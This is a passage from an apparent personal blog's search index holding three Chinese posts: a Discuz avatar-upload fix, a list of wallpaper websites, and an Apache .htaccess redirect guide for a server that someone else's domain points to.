            
            <tag> Hacker </tag>
            
            <tag> Tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[discuz 不能上传头像提示can not write to the data/tmp folder]]></title>
      <url>http://akkuman.coding.me/2016/05/31/DZ%E4%B8%8D%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F%E6%8F%90%E7%A4%BA%E4%B8%8D%E8%83%BD%E5%86%99%E5%85%A5data-tmp%E7%9B%AE%E5%BD%95.html</url>
      <content type="html"><![CDATA[<hr>
<h1 id="discuz-不能上传头像提示can-not-write-to-the-data-tmp-folder"><a href="#discuz-不能上传头像提示can-not-write-to-the-data-tmp-folder" class="headerlink" title="discuz 不能上传头像提示can not write to the data/tmp folder"></a>discuz 不能上传头像提示can not write to the data/tmp folder</h1><hr>
<h2 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h2><p>disucz头像上传不成功，提示data/tmp目录没有写入权限，这里的data/tmp是网站根目录uc_server/data/tmp这个目录，而不是根目录/data/tmp目录，其实/data下面本来没有tmp目录。</p>
<a id="more"></a>
<h2 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h2><p>首先看看uc_server/data/tmp有无写入权限，如果有权限那么就按照如下解决方法，需要修改php.ini，找到open_basedir选项，行首加分号;注销即可。</p>
]]></content>
      
        <categories>
            
            <category> Discuz </category>
            
        </categories>
        
        
        <tags>
            
            <tag> website </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Many Website Of WallPaper]]></title>
      <url>http://akkuman.coding.me/2016/05/31/Many%20Website%20Of%20WallPaper.html</url>
      <content type="html"><![CDATA[<p>我在这里给大家推荐几个不错的壁纸网站</p>
<p>毕竟一张赏心悦目的壁纸能让你的工作效率提高不少</p>
<p><strong>注意前方高能</strong></p>
<p><strong>一大波网站即将来袭</strong></p>
<h1 id="一系列-如你所见"><a href="#一系列-如你所见" class="headerlink" title="一系列  如你所见"></a>一系列  如你所见</h1><ul>
<li><a href="http://wall.alphacoders.com/" target="_blank" rel="external">alphacoders</a></li>
<li><a href="http://wallpaperdj.com/" target="_blank" rel="external">wallpaperdj</a></li>
<li><a href="https://alpha.wallhaven.cc/" target="_blank" rel="external">Wallhaven(<em>推荐</em>)</a><a id="more"></a></li>
<li><a href="http://wallpaperswa.com/" target="_blank" rel="external">wallpaperswa</a></li>
<li><a href="http://hdw.eweb4.com/" target="_blank" rel="external">eweb4</a></li>
<li><a href="http://wallls.com/" target="_blank" rel="external">wallls</a></li>
<li><a href="http://topwallpapers.pw/" target="_blank" rel="external">topwallpapers</a></li>
<li><a href="http://www.wallpaperfo.com/" target="_blank" rel="external">wallpaperfo</a></li>
<li><a href="http://www.wallpapermay.com/" target="_blank" rel="external">wallpapermay</a></li>
<li><a href="http://www.picstopin.com/" target="_blank" rel="external">picstopin</a></li>
<li><a href="http://www.wallpaperup.com/" target="_blank" rel="external">wallpaperup</a></li>
<li><a href="http://www.wall321.com/" target="_blank" rel="external">wall321</a></li>
<li><a href="http://www.wallsave.com/" target="_blank" rel="external">wallsave</a></li>
<li><a href="http://wallpaperswide.com/" target="_blank" rel="external">wallpaperswide</a></li>
<li><a href="https://www.desktopnexus.com/" target="_blank" rel="external">desktopnexus</a></li>
<li><a href="http://www.goodfon.su/" target="_blank" rel="external">goodfon</a></li>
<li><a href="http://www.vladstudio.com/zh/home/" target="_blank" rel="external">vladstudio(<em>推荐</em>)</a></li>
<li><a href="http://simpledesktops.com/" target="_blank" rel="external">simpledesktops(<em>极简</em>)</a></li>
<li><a href="https://interfacelift.com/wallpaper/downloads/date/any/" target="_blank" rel="external">interfacelift</a></li>
<li><a href="https://www.kuvva.com/" target="_blank" rel="external">kuvva</a></li>
<li><a href="http://switch-box.net/category/wallpaper" target="_blank" rel="external">switch-box</a></li>
<li><a href="http://cn.gde-fon.com/" target="_blank" rel="external">gde-fon</a></li>
<li><a href="http://www.istartedsomething.com/bingimages/" target="_blank" rel="external">bingimages</a></li>
<li><a href="http://www.wallpaper4k.com/" target="_blank" rel="external">wallpaper4k(<em>推荐</em>)</a></li>
<li><a href="http://feelgrafix.com/" target="_blank" rel="external">feelgrafix</a></li>
<li><a href="http://www.facets.la/" target="_blank" rel="external">facets(<em>元素块构图</em>)</a></li>
<li><a href="http://justinmaller.com/" target="_blank" rel="external">justinmaller(<em>略抽象</em>)</a></li>
<li><a href="http://7-themes.com/" target="_blank" rel="external">7-themes</a></li>
<li><a href="http://superhd.site/" target="_blank" rel="external">superhd</a></li>
<li><a href="http://www.fondos7.net/" target="_blank" rel="external">fondos7</a></li>
<li><a href="http://cn.forwallpaper.com/" target="_blank" rel="external">forwallpaper(<em>推荐</em>)</a></li>
<li><a href="http://h.bilibili.com/wallpaper?action=list" target="_blank" rel="external">大B站的动漫壁纸，二次元可选</a></li>
</ul>
<p>就推荐到这里吧，基本上是搜刮别人的答案而来，自己都有看过</p>
]]></content>
      
        <categories>
            
            <category> 生活 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[lamp服务器被人恶意绑定域名的解决办法]]></title>
      <url>http://akkuman.coding.me/2016/05/28/lamp%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E4%BA%BA%E6%81%B6%E6%84%8F%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html</url>
      <content type="html"><![CDATA[<h1 id="还没开始就被别人绑定了域名"><a href="#还没开始就被别人绑定了域名" class="headerlink" title="还没开始就被别人绑定了域名"></a>还没开始就被别人绑定了域名</h1><h2 id="事情的起因与发现"><a href="#事情的起因与发现" class="headerlink" title="事情的起因与发现"></a>事情的起因与发现</h2><p>刚买了个服务器搭建了一个dz，想着域名还没备案，就先搭建了起来，然后在做DDOS测试时偶然发现服务器被别人恶意把域名绑定了</p>
<h2 id="最初的解决方案"><a href="#最初的解决方案" class="headerlink" title="最初的解决方案"></a>最初的解决方案</h2><p>没管。。。。。。<br>后来发现有影响，朋友也一直给我说叫我整下</p>
<h2 id="利用重定向把恶意指向过来的域名指到别处"><a href="#利用重定向把恶意指向过来的域名指到别处" class="headerlink" title="利用重定向把恶意指向过来的域名指到别处"></a>利用重定向把恶意指向过来的域名指到别处</h2><p>要利用301重定向，首先我们要在Apache上配置一下，Apache默认是不开启.htaccess的</p>
<a id="more"></a>
<hr>
<h3 id="0x01-编辑httpd-conf文件"><a href="#0x01-编辑httpd-conf文件" class="headerlink" title="0x01.编辑httpd.conf文件"></a>0x01.编辑httpd.conf文件</h3><p>打开/etc/httpd/conf目录下的httpd.conf文件，找到这一行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LoadModule rewrite_module modules/mod_rewrite.so</div></pre></td></tr></table></figure></p>
<blockquote>
<p> 当然，你得确定你的/etc/httpd/modules下有mod_rewrite.so这个文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; ls /etc/httpd/modules | grep mod_rewrite</div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
</blockquote>
<p>如果你没有找到这一行，记得在httpd.conf文件里直接添加这一行</p>
<hr>
<h3 id="0x02-设置AllowOverride"><a href="#0x02-设置AllowOverride" class="headerlink" title="0x02.设置AllowOverride"></a>0x02.设置AllowOverride</h3><p>同样的在httpd.conf文件中找到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;Directory <span class="string">"/var/www/html"</span>&gt;</div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># Possible values for the Options directive are "None", "All",</span></div><div class="line">    <span class="comment"># or any combination of:</span></div><div class="line">    <span class="comment">#   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># Note that "MultiViews" must be named *explicitly* --- "Options All"</span></div><div class="line">    <span class="comment"># doesn't give it to you.</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># The Options directive is both complicated and important.  Please see</span></div><div class="line">    <span class="comment"># http://httpd.apache.org/docs/2.4/mod/core.html#options</span></div><div class="line">    <span class="comment"># for more information.</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    Options Indexes FollowSymLinks</div><div class="line"></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># AllowOverride controls what directives may be placed in .htaccess files.</span></div><div class="line">    <span class="comment"># It can be "All", "None", or any combination of the keywords:</span></div><div class="line">    <span class="comment">#   Options FileInfo AuthConfig Limit</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    AllowOverride All</div><div class="line"></div><div class="line">    <span class="comment">#</span></div><div class="line">    <span class="comment"># Controls who can get stuff from this server.</span></div><div class="line">    <span class="comment">#</span></div><div class="line">    Require all granted</div><div class="line">&lt;/Directory&gt;</div></pre></td></tr></table></figure></p>
<p>或者它长这个样子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;Directory /&gt;</div><div class="line">Options FollowSymLinks</div><div class="line">AllowOverride None</div><div class="line">&lt;/Directory&gt;</div></pre></td></tr></table></figure></p>
<p>什么，你告诉我还是找不到？？？<br>那教你一个办法<br>锁定关键词<code>FollowSymLinks</code>和<code>AllowOverride None</code></p>
<blockquote>
<p>vi的向下查找命令是<code>:/你要查找的</code><br>vi的向上查找命令是<code>:?你要查找的</code><br>n是下一个<br>N是上一个</p>
</blockquote>
<p>相信你已经找到了<br>接下来把<code>None</code>改成<code>All</code></p>
<hr>
<h3 id="0x03-编写规则文件-htaccess"><a href="#0x03-编写规则文件-htaccess" class="headerlink" title="0x03.编写规则文件.htaccess"></a>0x03.编写规则文件.htaccess</h3><p>跑去网站根目录下，比如我的是/var/www/html<br>如果存在.htaccess，忽略下一步，直接打开编辑<br>然后新建.htaccess文件<code>touch .htaccess</code><br>编辑.htaccess文件<code>vi .htaccess</code><br>添加如下规则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">RewriteEngine on</div><div class="line">RewriteCond %&#123;HTTP_HOST&#125; ^别人的域名.com$ [OR]</div><div class="line">RewriteCond %&#123;HTTP_HOST&#125; ^www.别人的域名.com$</div><div class="line">RewriteRule ^(.*)$ http://www.自己的域名.com/<span class="variable">$1</span> [R=301,L]</div></pre></td></tr></table></figure></p>
<hr>
<h1 id="个人的修改"><a href="#个人的修改" class="headerlink" title="个人的修改"></a>个人的修改</h1><p>我知道，你在网上所找到的方法都是上面那种代码，并且应该都没有提 教你怎么开启.htaccess<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E5%8E%BB%E4%BB%96%E7%88%B9%E7%9A%84%E9%80%BB%E8%BE%91.jpg" alt="去他爹的"><br>但是本人实验过，这配置进去还有问题，设置重启Apache后，访问网站提示500错误<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/500error.png" alt="500error"><br>机智的我总要查看日志啊<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /var/<span class="built_in">log</span>/messages | grep httpd</div></pre></td></tr></table></figure></p>
<p>找到了错误<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/QQ%E5%9B%BE%E7%89%8720160528214617.png" alt="httpderror"><br>英语不太好，但是大致知道是服务器没有限定域名，需要修改ServerName,而ServerName字段值在httpd.conf中是被注释掉的<br>我们在httpd.conf修改它<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#ServerName: www.example.com:80</span></div></pre></td></tr></table></figure></p>
<p>改为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ServerName: 115.**.**.57:80</div></pre></td></tr></table></figure></p>
<p>然后重启Apache，可以访问了</p>
<hr>
<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>好的故事都会有后续的</p>
<p>以为这样就万事大吉了?</p>
<p>但是我这个被坑得不轻<br>admin.xx.com都被他解析到我服务器上来了</p>
<p>老衲怎么破<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E6%88%90%E9%BE%99.jpg" alt="成龙挠头"><br>.htaccess好像可以用正则表达式，一查，果然<br>那就改一下.htaccess咯<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E5%82%BB%E7%AC%91.jpg" alt="shaxiao"><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">RewriteEngine on</div><div class="line">RewriteCond %&#123;HTTP_HOST&#125; ^别人的域名.com$ [OR]</div><div class="line">RewriteCond %&#123;HTTP_HOST&#125; ^.*.别人的域名.com$</div><div class="line">RewriteRule ^(.*)$ http://www.自己的域名.com/<span class="variable">$1</span> [R=301,L]</div></pre></td></tr></table></figure></p>
<p>机智的你已经发现第三行中的www被我改成了.<em>，就是匹配0个或者多个字符，当然</em>你可以改成+</p>
<p>然后重启Apache</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl restart httpd</div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service httpd restart</div></pre></td></tr></table></figure></p>
<p>现在我再访问。。。嘿嘿嘿，被我跳转到百度了<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E6%9A%B4%E6%BC%AB%E5%98%BF%E5%98%BF%E5%98%BF.jpeg" alt="heihei"></p>
<hr>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>当然，还有其他的方法，自己也可以去网上找找<br>对了，那个刚才在httpd.conf里换ip的地方也可换自己的域名，因为我的还在备案，就没改</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
